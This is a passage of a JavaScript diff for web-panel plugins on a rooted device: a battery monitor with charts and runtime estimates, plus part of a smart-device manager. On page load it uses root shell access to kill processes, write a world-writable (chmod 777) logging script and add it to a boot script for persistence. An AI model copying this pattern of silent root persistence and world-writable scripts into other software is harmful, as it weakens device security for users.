+             pluginState.batteryData.current = parseInt(current) || 0;
+             updateVoltageCurrentDisplay();
+             updateCpuTempDisplay();
+        }
+    } catch(e) {}
+};
+
+const updateVoltageCurrentDisplay = () => {
+        const battery = pluginState.batteryData;
+        
+        const vEl = getElement('battery_voltage');
+        if(vEl) vEl.innerHTML = battery.voltage > 0 ? `${(battery.voltage / 1000000).toFixed(2)}<span class="bp-unit">V</span>` : "--";
+
+        const cEl = getElement('battery_current');
+        if(cEl) {
+            if (battery.current !== 0) cEl.innerHTML = `${(battery.current / 1000).toFixed(0)}<span class="bp-unit">mA</span>`;
+            else cEl.innerHTML = `0<span class="bp-unit">mA</span>`;
+        }
+        
+        let powerVal = "--";
+        if (battery.voltage !== 0 && battery.current !== 0) {
+            const voltageInV = battery.voltage / 100000;
+            const currentInA = battery.current / 1000000;
+            let power = voltageInV * currentInA * 0.1;
+            powerVal = power.toFixed(2);
+        } else if (battery.voltage === 0 || battery.current === 0) {
+            powerVal = "0.00";
+        }
+
+        const pEl = getElement('battery_power');
+        if(pEl) pEl.innerHTML = powerVal !== "--" ? `${powerVal}<span class="bp-unit">W</span>` : "--";
+
+        const headerPowerEl = getElement('header_power');
+        if(headerPowerEl) headerPowerEl.textContent = powerVal;
+    };
+   const updateBatteryDisplay = () => {
+        const battery = pluginState.batteryData;
+        const statusInfo = PLUGIN_CONFIG.STATUS_MAP[battery.status] || PLUGIN_CONFIG.STATUS_MAP.Unknown;
+        const themeColor = getBatteryColor(battery.level);
+        const isCharging = battery.status === 'Charging';
+        const iconSvg = isCharging ? ICONS.BOLT : ICONS.BATTERY;
+        const iconColor = isCharging ? '#f1fa8c' : themeColor;
+        
+        const headerIconContainer = getElement('header_icon_container');
+        if(headerIconContainer) {
+            headerIconContainer.innerHTML = iconSvg;
+            headerIconContainer.style.width = isCharging ? "16px" : "18px";
+            headerIconContainer.style.height = isCharging ? "16px" : "18px";
+            
+            // 给顶部小闪电加能量脉冲动效
+            if (battery.status === 'Charging' && String(battery.chargingEnabled).trim() !== '0') {
+                headerIconContainer.style.color = "#50fa7b";
+                headerIconContainer.classList.add('bp-pulse-active'); // 启动脉冲
+            } else {
+                headerIconContainer.style.color = isCharging ? "#fff" : themeColor;
+                headerIconContainer.classList.remove('bp-pulse-active'); // 停止脉冲
+            }
+        }
+
+        const mainIconContainer = getElement('battery_icon_main');
+        if(mainIconContainer) {
+            mainIconContainer.innerHTML = iconSvg;
+            mainIconContainer.style.color = iconColor;
+        }
+
+        const ring = getElement('battery_ring');
+        if(ring) {
+            const dashoffset = PLUGIN_CONFIG.RING_CIRCUMFERENCE * (1 - battery.level / 100);
+            ring.style.strokeDashoffset = dashoffset;
+            ring.style.stroke = themeColor;
+        }
+        
+       getElement('battery_percent').textContent = `${battery.level}%`;
+        let currentStatusText = statusInfo.text;
+        
+        // --- 1. 顶部折叠文字  ---
+        const headerSub = getElement('header_status_text');
+        if (headerSub) {
+             if (battery.status === 'Charging' && String(battery.chargingEnabled).trim() !== '0') {
+                 headerSub.textContent = ` 充电中 ${battery.level}%`;
+                 headerSub.style.color ="#50fa7b"; // 充电中绿字
+                     } else {
+                 if (battery.status === 'Full' || (battery.status === 'Charging' && String(battery.chargingEnabled).trim() === '0')) {
+                     currentStatusText = "直供电中";
+                     headerSub.style.color ="#8be9fd"; // 直供电蓝
+                 } else {
+                     // 放电状态下颜色
+                     headerSub.style.color ="rgba(255,255,255,0.6)";  
+                 }
+                 headerSub.textContent = `${currentStatusText} ${battery.level}%`;
+             }
+             headerSub.classList.remove('bp-pulse-active');
+        }
+        
+        // ---顶部小圆环和温度 ---
+        const headerRing = getElement('header_ring_path');
+        if(headerRing) {
+             const headerDash = 100 * (1 - battery.level / 100);
+             headerRing.style.strokeDashoffset = headerDash;
+             headerRing.style.stroke = themeColor;
+        }
+
+        const tempC = battery.temperature / 10;
+        const tempColor = getTemperatureColor(tempC);
+        
+const tempElement = getElement('battery_temp');
+        if (tempElement) {
+            tempElement.innerHTML = `${tempC}<span class="bp-unit">°C</span>`;
+            tempElement.style.color = tempColor;
+        }
+        
+        const headerTempEl = getElement('header_temp');
+        if(headerTempEl) {
+             headerTempEl.textContent = tempC;
+             headerTempEl.style.color = tempColor;
+        } 
+
+      // --- 提取数据并画图 ---
+        // 1. 温度曲线 ( 2 小时，一分钟一帧 = 120 个点)
+        let tempRes = getChartData(pluginState.history.temp, pluginState.history.time, 2, 120);
+        if (tempRes.data.length > 1) { 
+            if (!pluginState.tempAnimated) {
+                animateChart('temp_chart_canvas', tempRes.data, tempColor, true, false);
+                pluginState.tempAnimated = true;
+            } else {
+                drawChart('temp_chart_canvas', tempRes.data, tempColor, true, false);
+            }
+        }
+
+        // 2. 功率曲线 ( 1 小时！一分钟一帧 = 60 个点)
+        if (pluginState.history.power && pluginState.history.power.length > 0) {
+            let powerRes = getChartData(pluginState.history.power, pluginState.history.time, 1, 60);
+            if (powerRes.data.length > 1) { 
+                if (!pluginState.powerAnimated) {
+                    animateChart('power_chart_canvas', powerRes.data, '#fbbf24', false, false);
+                    pluginState.powerAnimated = true;
+                } else {
+                    drawChart('power_chart_canvas', powerRes.data, '#fbbf24', false, false);
+                }
+            }
+        }
+
+        // 3. 24小时大图表 ( 24 小时，一分钟一帧 = 1440 个点)
+        if (getElement('bp_battery_chart_modal') && getElement('bp_battery_chart_modal').style.display === 'flex') {
+            let levelRes = getChartData(pluginState.history.level, pluginState.history.time, 24, 1440);
+            drawChart('level_chart_canvas', levelRes.data, '#fbbf24', true, true, 1, levelRes.time);
+        }
+
+
+// --- 2. 动态续航预估逻辑 (8秒防抖 + 智能目标感知 + 滑动平滑计算) ---
+        const timeLabelEl = getElement('battery_time_label');
+        const timeValEl = getElement('battery_time_val');
+        
+        if (timeLabelEl && timeValEl) {
+            const now = Date.now();
+            const currentChargeState = battery.status + battery.chargingEnabled;
+            const isDirectPower = (battery.status === 'Full' || (battery.status === 'Charging' && String(battery.chargingEnabled).trim() === '0'));
+            
+            const formatTimeStr = (hours) => {
+                if (!isFinite(hours) || hours <= 0) return "--";
+                if (hours > 99) return "99h+";
+                const h = Math.floor(hours);
+                const m = Math.floor((hours - h) * 60);
+                return h === 0 ? `${m}m` : `${h}h ${m}m`;
+            };
+
+            // 状态突变或你点击了按钮强制更新时
+            if (pluginState.lastStatus !== currentChargeState || pluginState.lastStatus === "FORCE_UPDATE") {
+                if (pluginState.lastStatus !== "FORCE_UPDATE") {
+                    pluginState.statusStartTime = now;
+                }
+                pluginState.lastStatus = currentChargeState;
+                pluginState.smoothedCurrent = null; // 清空旧电流
+                
+                if (isDirectPower) {
+                    pluginState.cachedTimeLabel = "当前";
+                    pluginState.cachedTimeVal = "直供电中";
+                    pluginState.cachedTimeColor = "#8be9fd";    //当前字体颜色
+                } else {
+                    // 如果开启自动模式，立刻显示目标电量
+                    let targetPercent = 100;
+                    if (typeof CONFIG !== 'undefined' && CONFIG.enabled) {
+                        targetPercent = Number(CONFIG.max_charge) || 100;
+                    }
+                    pluginState.cachedTimeLabel = (battery.status === 'Charging' && targetPercent < 100) ? `距${targetPercent}%预计` : "预估";
+                    pluginState.cachedTimeVal = "计算中";
+                    pluginState.cachedTimeColor = "#bd93f9"; 
+                }
+            }
+            
+            const timeSinceInit = now - pluginState.initTime;
+            const timeSinceStateChange = now - pluginState.statusStartTime;
+
+            if (!isDirectPower) {
+                // 前 8 秒（3秒稳定空余 + 5秒静默采集电流），UI 锁死在“计算中”
+                if (timeSinceInit < 8000 || timeSinceStateChange < 8000) {
+                    
+                       if (timeSinceInit < 3000 && pluginState.lastStatus !== "FORCE_UPDATE") {
+                        try {
+                            const saved = JSON.parse(localStorage.getItem('bp_time_cache') || '{}');
+                            if (saved.state === currentChargeState && saved.remainMs) {
+                                const elapsed = now - saved.timestamp;
+                                const newRemainMs = saved.remainMs - elapsed;
+                                if (newRemainMs > 0) {
+                                    pluginState.cachedTimeLabel = saved.label;
+                                    pluginState.cachedTimeVal = formatTimeStr(newRemainMs / 3600000);
+                                    pluginState.cachedTimeColor = saved.color;
+                                }
+                            }
+                        } catch(e) {}
+                    }
+                    
+                    if ((timeSinceInit > 3000 || timeSinceStateChange > 3000) && (timeSinceInit < 8000 || timeSinceStateChange < 8000)) {
+                        const raw_current_mA = Math.abs(battery.current / 1000);
+                        if (pluginState.smoothedCurrent === null) {
+                            pluginState.smoothedCurrent = raw_current_mA;
+                        } else {
+                            pluginState.smoothedCurrent = (raw_current_mA * 0.3) + (pluginState.smoothedCurrent * 0.7);
+                        }
+                    }
+                } 
+
+                else if (pluginState.cachedTimeVal === "计算中" || now - pluginState.lastTimeCalc > 60000) {
+                    pluginState.lastTimeCalc = now;
+                    // 老化折损系数(0.85)
+                    const capacity_mAh = ((battery.chargeFull / 1000) || 3000) * 0.85;
+                    const raw_current_mA = Math.abs(battery.current / 1000);
+                    
+                    if (pluginState.smoothedCurrent === null) {
+                        pluginState.smoothedCurrent = raw_current_mA;
+                    } else {
+                        pluginState.smoothedCurrent = (raw_current_mA * 0.3) + (pluginState.smoothedCurrent * 0.7);
+                    }
+                    
+                    let remain_hours = 0;
+                    
+                    if (pluginState.smoothedCurrent < 50) { 
+                         pluginState.cachedTimeLabel = "预估";
+                         pluginState.cachedTimeVal = "计算中";
+                         pluginState.cachedTimeColor = "#bd93f9";
+                    } else if (battery.status === 'Charging') {
+                         
+                         let targetPercent = 100;
+                         if (typeof CONFIG !== 'undefined' && CONFIG.enabled) {
+                             targetPercent = Number(CONFIG.max_charge) || 100;
+                         }
+                         
+                         if (battery.level >= targetPercent && targetPercent < 100) {
+                             pluginState.cachedTimeLabel = "即将直供电";
+                             pluginState.cachedTimeVal = "--";
+                         } else {
+
+                             const remain_mAh = capacity_mAh * ((targetPercent - battery.level) / 100);
+                             remain_hours = remain_mAh / pluginState.smoothedCurrent;
+                             pluginState.cachedTimeLabel = targetPercent < 100 ? `距${targetPercent}%预计` : "充满预计";
+                             pluginState.cachedTimeVal = formatTimeStr(remain_hours);
+                         }
+                         pluginState.cachedTimeColor = "#61d882"; 
+                         
+                    } else if (battery.status === 'Discharging') {
+                         const remain_mAh = capacity_mAh * (battery.level / 100);
+                         remain_hours = remain_mAh / pluginState.smoothedCurrent;
+                         pluginState.cachedTimeLabel = "预计剩余";
+                         pluginState.cachedTimeVal = formatTimeStr(remain_hours);
+                         pluginState.cachedTimeColor = "#ffb86c"; 
+                    }
+
+                    // 写入缓存
+                    if (remain_hours > 0) {
+                        localStorage.setItem('bp_time_cache', JSON.stringify({
+                            timestamp: now,
+                            remainMs: remain_hours * 3600000,
+                            state: currentChargeState,
+                            label: pluginState.cachedTimeLabel,
+                            color: pluginState.cachedTimeColor
+                        }));
+                    }
+                }
+            }
+                    
+ // 统一渲染UI
+            timeLabelEl.textContent = pluginState.cachedTimeLabel;
+            timeValEl.textContent = pluginState.cachedTimeVal;
+            timeLabelEl.style.fill = pluginState.cachedTimeColor;
+        }
+
+        const container = document.getElementById('BATTERY_PRO_CONTAINER');
+        if(container) container.classList.add('bp-loaded');
+    };
+
+// === 后台记录器 ===
+    const installDeviceLogger = async () => {
+        const checkContent = await runShellWithRoot(`cat /sdcard/kano_battery_logger.sh 2>/dev/null`);
+        const needFix = checkContent.content && (!checkContent.content.includes('# v6') || checkContent.content.includes('\\$'));
+        
+        const checkProc = await runShellWithRoot(`ps -ef | grep kano_battery_logger | grep -v grep`);
+        if (!checkProc.content || needFix) {
+            console.log("检测到需要升级 V6 温度限速版守护进程...");
+            
+            const lines = checkProc.content ? checkProc.content.trim().split('\n') : [];
+            for (const line of lines) {
+                const parts = line.trim().split(/\s+/);
+                const pid = parts[1];
+                if (pid && /^\d+$/.test(pid)) {
+                    await runShellWithRoot(`kill -9 ${pid}`);
+                }
+            }
+            
+            // V6脚本
+            const script = `#!/system/bin/sh\n# v6\nLAST_T=0\nt=0\nwhile true;\ndo\n  NOW=$(date +%s)\n  c=$(cat /sys/class/power_supply/battery/capacity 2>/dev/null || echo 0)\n  if [ $((NOW - LAST_T)) -ge 30 ]; then\n    t=$(cat /sys/class/power_supply/battery/temp 2>/dev/null || echo 0)\n    LAST_T=$NOW\n  fi\n  v=$(cat /sys/class/zte_power_supply/zte_battery/voltage_now 2>/dev/null || cat /sys/class/power_supply/battery/voltage_now 2>/dev/null || echo 0)\n  i=$(cat /sys/class/zte_power_supply/zte_battery/current_now 2>/dev/null || cat /sys/class/power_supply/battery/current_now 2>/dev/null || echo 0)\n  echo "$NOW,$c,$t,$v,$i" >> /sdcard/kano_battery_history.log\n  if [ $(wc -l < /sdcard/kano_battery_history.log) -gt 20000 ];\nthen\n    tail -n 19000 /sdcard/kano_battery_history.log > /sdcard/kano_battery_history.tmp && mv /sdcard/kano_battery_history.tmp /sdcard/kano_battery_history.log\n  fi\n  ACTIVE_TIME=$(cat /dev/bp_web_active 2>/dev/null || echo 0)\n  if [ $((NOW - ACTIVE_TIME)) -lt 12 ];\nthen\n    sleep 5\n  else\n    sleep 30\n  fi\ndone`;
+            
+            await runShellWithRoot(`cat << 'EOF' > /sdcard/kano_battery_logger.sh\n${script}\nEOF`);
+            await runShellWithRoot(`chmod 777 /sdcard/kano_battery_logger.sh`);
+            await runShellWithRoot(`nohup /system/bin/sh /sdcard/kano_battery_logger.sh >/dev/null 2>&1 &`);
+            await runShellWithRoot(`grep -qxF '/system/bin/sh /sdcard/kano_battery_logger.sh &' /sdcard/ufi_tools_boot.sh || echo '/system/bin/sh /sdcard/kano_battery_logger.sh &' >> /sdcard/ufi_tools_boot.sh`);
+        }
+    };
+
+// 从设备物理文件拉取过去 24 小时的数据
+    const fetchDeviceHistory = async () => {
+        const res = await runShellWithRoot(`cat /sdcard/kano_battery_history.log 2>/dev/null`);
+        if (res && res.success && res.content) {
+            const lines = res.content.trim().split('\n');
+            const times = [], temps = [], levels = [], powers = [];
+            
+            lines.forEach(line => {
+                const parts = line.split(',');
+                if (parts.length >= 3) {
+                    times.push(parseInt(parts[0]) * 1000);
+                    levels.push(parseInt(parts[1]));
+                    temps.push(parseInt(parts[2]) / 10);
+
+                    if (parts.length >= 5) {
+                        const vol = parseInt(parts[3]) || 0;
+                        const cur = parseInt(parts[4]) || 0;
+                        const pwr = (vol / 1000000) * (cur / 1000000); 
+                        powers.push(pwr);
+                    } else {
+                        powers.push(0); 
+                    }
+                }
+            });
+            
+            if (levels.length > 0) {
+                pluginState.history.time = times;
+                pluginState.history.level = levels;
+                pluginState.history.temp = temps;
+                pluginState.history.power = powers; 
+            }
+        }
+    };
+const startMonitoring = async () => {
+        if (pluginState.monitoring) return;
+        
+        // 瞬间读取当前硬件状态，不被日志读取阻塞
+        fetchBatteryInfo(); 
+        fetchVoltageCurrentInfo();
+        
+        pluginState.updateTimer = setInterval(() => {
+            fetchBatteryInfo(); 
+        }, 3000);
+        if(pluginState.voltageCurrentTimer) clearInterval(pluginState.voltageCurrentTimer);
+        pluginState.voltageCurrentTimer = setInterval(fetchVoltageCurrentInfo, 1000);
+        updateCpuTempDisplay(); // 先立刻执行一次防闪烁
+        
+        pluginState.monitoring = true;
+
+        // 底层日志后台异步执行
+        installDeviceLogger().then(async () => {
+            await fetchDeviceHistory();
+            if (typeof updateBatteryDisplay === 'function') updateBatteryDisplay();
+        });
+
+       // 首次打开网页，发送一次激活心跳
+        runShellWithRoot(`date +%s > /dev/bp_web_active`);
+        // 网页开启期间：每 5 秒发送心跳保持激活，拉取图表数据
+        // 【内存优化】保存定时器引用，防止重复创建导致内存泄漏
+        pluginState.heartbeatTimer = setInterval(async () => {
+            runShellWithRoot(`date +%s > /dev/bp_web_active`); 
+            await fetchDeviceHistory();
+            if (typeof updateBatteryDisplay === 'function') updateBatteryDisplay();
+        }, 5000);
+        pluginState.configTimer = setInterval(async () => {
+            if (typeof getConfig === 'function') await getConfig();
+        }, 30000);
+    };
+
+    const applyCollapseState = (isOpen) => {
+        const toggle = document.getElementById('bp_collapse_toggle');
+        const main = document.getElementById('bp_body_main');
+        const header = document.getElementById('bp_header');
+        
+        if (!main || !header || !toggle) return;
+        if(isOpen){ 
+            main.classList.remove('collapsed');
+            main.style.maxHeight = '500px'; 
+            main.style.opacity = '1';
+            header.classList.remove('is-collapsed');
+            toggle.checked = true;
+        } else { 
+            main.classList.add('collapsed');
+            main.style.maxHeight = '0';
+            main.style.opacity = '0';
+            header.classList.add('is-collapsed');
+            toggle.checked = false;
+        }
+    };
+    const initializeToggle = () => {
+        const toggle = document.getElementById('bp_collapse_toggle');
+        const COLLAPSE_KEY = 'bp_collapse_status';
+        
+        if(!toggle) return;
+
+        const savedState = localStorage.getItem(COLLAPSE_KEY);
+        if (savedState === 'closed') applyCollapseState(false);
+        else applyCollapseState(true);
+        toggle.onchange = function() {
+            if(this.checked){ 
+                applyCollapseState(true);
+                localStorage.setItem(COLLAPSE_KEY, 'open');
+            } else { 
+                applyCollapseState(false);
+                localStorage.setItem(COLLAPSE_KEY, 'closed');
+                if(typeof window.close_charge_settings === 'function') {
+                    window.close_charge_settings();
+                }
+                const chartModal = document.getElementById('bp_battery_chart_modal');
+                if (chartModal) chartModal.style.display = 'none';
+            }
+        };
+    };
+
+const initializeMonitoring = async (retryCount = 0) => {
+    // 1. 先检查 Root 
+    if (await checkRootAccess()) {
+     
+        startMonitoring();
+
+    } else {
+        if (retryCount < 3) {
+            setTimeout(() => initializeMonitoring(retryCount + 1), 1000);
+        }
+    }
+};
+
+   // 3. 绑定“充电管理”按钮事件
+    document.getElementById('bp_open_charge_btn').onclick = openChargeSettings;
+    const ringTrigger = getElement('bp_ring_trigger');
+    const chartModal = getElement('bp_battery_chart_modal');
+    const closeBtn = getElement('bp_close_chart_btn');
+    if (ringTrigger && chartModal && closeBtn) {
+        ringTrigger.onclick = () => {
+            chartModal.style.display = 'flex';
+            setTimeout(() => { 
+                let levelRes = getChartData(pluginState.history.level, pluginState.history.time, 24, 1440);
+                animateChart('level_chart_canvas', levelRes.data, '#fbbf24', true, true, levelRes.time);
+            }, 50);
+           };
+        closeBtn.onclick = () => { chartModal.style.display = 'none'; };
+    }
+    // 4. 初始化折叠状态
+    initializeToggle();
+
+    // 5. 启动数据监控
+    setTimeout(() => initializeMonitoring(0), 10);
+
+    } // end of 防重复注入 if块
+
+    collapseGen("#collapse_SMART_btn", "#collapse_SMART", "#collapse_SMART", (newVal) => {
+        if (newVal == 'open') {
+            SCAN_INTERVAL && SCAN_INTERVAL()
+            // 恢复用户设置的扫描间隔
+            var _savedInt = null
+            try { _savedInt = localStorage.getItem('smart_scan_interval_ms') } catch(e) {}
+            if (_savedInt) SCAN_INTERVAL_MS = parseInt(_savedInt) || 10000
+            SCAN_INTERVAL = requestInterval(function() { scanDevices() }, SCAN_INTERVAL_MS)
+            scanDevices()
+            addLog('面板已展开，开始监控')
+            addDiagLog('启动 v'+PLUGIN_VERSION+'，开始扫描+游戏检测 (间隔:'+(SCAN_INTERVAL_MS/1000)+'秒)', 'success')
+            // 启动游戏识别循环（只认前台应用，窗口焦点优先，平板只认焦点）
+            GAME_BOOST_ENABLED = true
+            if (!GAME_MONITOR_INTERVAL) {
+                gameMonitorLoop()
+                GAME_MONITOR_INTERVAL = requestInterval(function() { gameMonitorLoop() }, 3000)
+            }
+            loadTickets()
+        } else {
+            SCAN_INTERVAL && SCAN_INTERVAL()
+            addLog('面板已收起')
+            addDiagLog('面板收起', 'info')
+        }
+    })
+    if (localStorage.getItem("#collapse_SMART") == 'open') {
+        var _savedInt2 = null
+        try { _savedInt2 = localStorage.getItem('smart_scan_interval_ms') } catch(e) {}
+        if (_savedInt2) SCAN_INTERVAL_MS = parseInt(_savedInt2) || 10000
+        SCAN_INTERVAL = requestInterval(function() { scanDevices() }, SCAN_INTERVAL_MS)
+        scanDevices()
+        addLog('智能设备管理器已启动')
+        addDiagLog('启动 v'+PLUGIN_VERSION+'，已启动扫描 (间隔:'+(SCAN_INTERVAL_MS/1000)+'秒)', 'success')
+        // 启动游戏识别循环（只认前台应用，窗口焦点优先，平板只认焦点）
+        GAME_BOOST_ENABLED = true
+        if (!GAME_MONITOR_INTERVAL) {
+            gameMonitorLoop()
+            GAME_MONITOR_INTERVAL = requestInterval(function() { gameMonitorLoop() }, 3000)
+        }
+        loadTickets()
+    }
+
+    // 捕获当前插件代码，供保存按钮使用
+    if (!window.__SMART_PLUGIN_CODE__) {
+        try {
+            var _scripts = document.querySelectorAll('script')
+            for (var _si = _scripts.length - 1; _si >= 0; _si--) {
+                var _sc = _scripts[_si].textContent || ''
+                if (_sc.indexOf('PLUGIN_VERSION') >= 0 && _sc.indexOf('SmartDeviceManager') >= 0) {
+                    window.__SMART_PLUGIN_CODE__ = _sc; break
+                }
+            }
+        } catch(e) {}
+    }
+
+
+} catch(initErr) {
+    console.error('[SmartDeviceManager] 初始化错误:', initErr)
+    try { createToast('插件初始化出错: '+initErr, 'red', 8000) } catch(e) {}
+}
+})()
         const results = [];
         for (const node of candidates) {
             const testUrl = `https://${node}/gh/xiaoyutxy/my-plugins@main/_latest.json?_=${Date.now()}`;
